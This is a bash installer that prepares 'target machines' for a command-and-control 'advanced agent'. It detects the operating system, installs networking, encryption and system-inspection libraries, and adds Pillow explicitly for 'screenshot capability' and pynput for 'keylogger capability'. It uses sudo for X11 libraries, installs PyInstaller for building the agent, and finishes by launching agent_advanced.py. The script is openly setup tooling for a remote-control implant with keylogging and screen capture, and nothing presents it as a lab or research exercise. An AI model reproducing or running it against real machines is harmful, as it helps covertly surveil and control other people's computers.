#!/bin/bash

# Install Advanced Agent Dependencies
# Run this on target machines before deploying agent

echo "========================================="
echo "  C2 Advanced Agent - Dependency Installer"
echo "========================================="
echo ""

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Check if running as root/admin
if [[ $EUID -ne 0 ]] && [[ "$OSTYPE" != "msys" ]]; then
   echo -e "${YELLOW}[WARNING] Not running as root. Some installations may fail.${NC}"
fi

# Detect OS
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS="linux"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    OS="mac"
elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
    OS="windows"
else
    OS="unknown"
fi

echo -e "${YELLOW}[INFO]${NC} Detected OS: $OS"
echo ""

# Check Python
echo -e "${YELLOW}[CHECK]${NC} Checking Python..."
if command -v python3 &> /dev/null; then
    PYTHON_VERSION=$(python3 --version)
    echo -e "${GREEN}✓${NC} Python found: $PYTHON_VERSION"
else
    echo -e "${RED}✗${NC} Python 3 not found"
    echo "Please install Python 3.8 or higher"
    exit 1
fi

# Check pip
echo -e "${YELLOW}[CHECK]${NC} Checking pip..."
if command -v pip3 &> /dev/null; then
    echo -e "${GREEN}✓${NC} pip found"
else
    echo -e "${RED}✗${NC} pip not found"
    echo "Installing pip..."
    python3 -m ensurepip --default-pip
fi

echo ""
echo "========================================="
echo "  Installing Dependencies"
echo "========================================="
echo ""

# Core dependencies
echo -e "${YELLOW}[INSTALL]${NC} Core dependencies..."
pip3 install websockets pycryptodome psutil requests --quiet

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} Core dependencies installed"
else
    echo -e "${RED}✗${NC} Core installation failed"
    exit 1
fi

# PIL/Pillow for screenshots
echo -e "${YELLOW}[INSTALL]${NC} Pillow (screenshot capability)..."
pip3 install pillow --quiet

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} Pillow installed"
else
    echo -e "${RED}✗${NC} Pillow installation failed"
fi

# pynput for keylogger
echo -e "${YELLOW}[INSTALL]${NC} pynput (keylogger capability)..."

if [[ "$OS" == "linux" ]]; then
    # Linux may need additional dependencies
    echo -e "${YELLOW}[INFO]${NC} Installing X11 dependencies for Linux..."
    
    if command -v apt-get &> /dev/null; then
        sudo apt-get update -qq
        sudo apt-get install -y python3-xlib python3-dev -qq
    elif command -v yum &> /dev/null; then
        sudo yum install -y python3-xlib python3-devel -q
    fi
fi

pip3 install pynput --quiet

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} pynput installed"
else
    echo -e "${RED}✗${NC} pynput installation failed"
    echo -e "${YELLOW}[INFO]${NC} Keylogger will not be available"
fi

# PyInstaller for building (optional)
echo -e "${YELLOW}[INSTALL]${NC} PyInstaller (optional - for building)..."
pip3 install pyinstaller --quiet

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} PyInstaller installed"
else
    echo -e "${YELLOW}⚠${NC} PyInstaller installation failed (optional)"
fi

echo ""
echo "========================================="
echo "  Verification"
echo "========================================="
echo ""

# Test imports
echo -e "${YELLOW}[TEST]${NC} Testing imports..."

python3 << EOF
import sys
errors = []

try:
    import websockets
    print("✓ websockets")
except ImportError:
    print("✗ websockets")
    errors.append("websockets")

try:
    from Crypto.Cipher import AES
    print("✓ pycryptodome")
except ImportError:
    print("✗ pycryptodome")
    errors.append("pycryptodome")

try:
    import psutil
    print("✓ psutil")
except ImportError:
    print("✗ psutil")
    errors.append("psutil")

try:
    import requests
    print("✓ requests")
except ImportError:
    print("✗ requests")
    errors.append("requests")

try:
    from PIL import ImageGrab
    print("✓ PIL/Pillow")
except ImportError:
    print("⚠ PIL/Pillow (optional)")

try:
    from pynput import keyboard
    print("✓ pynput")
except ImportError:
    print("⚠ pynput (optional)")

if errors:
    sys.exit(1)
else:
    sys.exit(0)
EOF

if [ $? -eq 0 ]; then
    echo ""
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}  Installation Complete!${NC}"
    echo -e "${GREEN}=========================================${NC}"
    echo ""
    echo "You can now run the advanced agent:"
    echo "  python3 agent_advanced.py"
    echo ""
else
    echo ""
    echo -e "${RED}=========================================${NC}"
    echo -e "${RED}  Installation Failed${NC}"
    echo -e "${RED}=========================================${NC}"
    echo ""
    echo "Some dependencies failed to install."
    echo "The agent may not work correctly."
    echo ""
    exit 1
fi
